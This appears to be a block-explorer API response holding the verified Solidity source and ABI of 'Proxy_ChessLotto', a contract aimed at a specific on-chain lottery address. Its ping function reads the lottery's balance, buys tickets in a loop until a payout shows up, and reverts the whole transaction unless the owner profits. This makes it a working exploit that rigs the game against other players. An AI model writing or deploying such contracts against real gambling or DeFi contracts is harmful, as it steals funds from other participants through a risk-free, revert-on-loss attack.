{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.0;\r\n\r\ncontract TargetInterface {\r\n    function AddTicket() public payable;\r\n}\r\n\r\ncontract Proxy_ChessLotto {\r\n    \r\n    address targetAddress = 0x309dFE127881922C356Fe8F571846150768C551e;\r\n    uint256 betSize = 0.00064 ether;\r\n\r\n    address payable private owner;\r\n    \r\n    modifier onlyOwner {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n    \r\n    constructor() public payable {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    function ping(bool _keepBalance) public payable onlyOwner {\r\n        uint256 targetBalanceInitial = address(targetAddress).balance;\r\n        uint256 existingBetsInitial = targetBalanceInitial / betSize;\r\n        require(existingBetsInitial > 0);\r\n        \r\n        uint256 ourBalanceInitial = address(this).balance;\r\n        \r\n        TargetInterface target = TargetInterface(targetAddress);\r\n    \r\n        uint256 ourBetCount = 64 - existingBetsInitial;\r\n\r\n        for (uint256 ourBetIndex = 0; ourBetIndex < ourBetCount; ourBetIndex++) {\r\n            target.AddTicket.value(betSize)();\r\n            \r\n            if (address(targetAddress).balance < targetBalanceInitial) {\r\n                break;\r\n            }\r\n        }\r\n        \r\n        require(address(this).balance > ourBalanceInitial);\r\n        \r\n        if (!_keepBalance) {\r\n            owner.transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    function withdraw() public onlyOwner {\r\n        owner.transfer(address(this).balance);\r\n    }    \r\n    \r\n    function kill() public onlyOwner {\r\n        selfdestruct(owner);\r\n    }    \r\n    \r\n    function () external payable {\r\n    }\r\n    \r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"_keepBalance\",\"type\":\"bool\"}],\"name\":\"ping\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Proxy_ChessLotto","CompilerVersion":"v0.5.2+commit.1df8f40c","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://2eb7b682cfc83b2dc34cf48372a4fe366749332d5633a52fcaa584f516abf0e4"}]}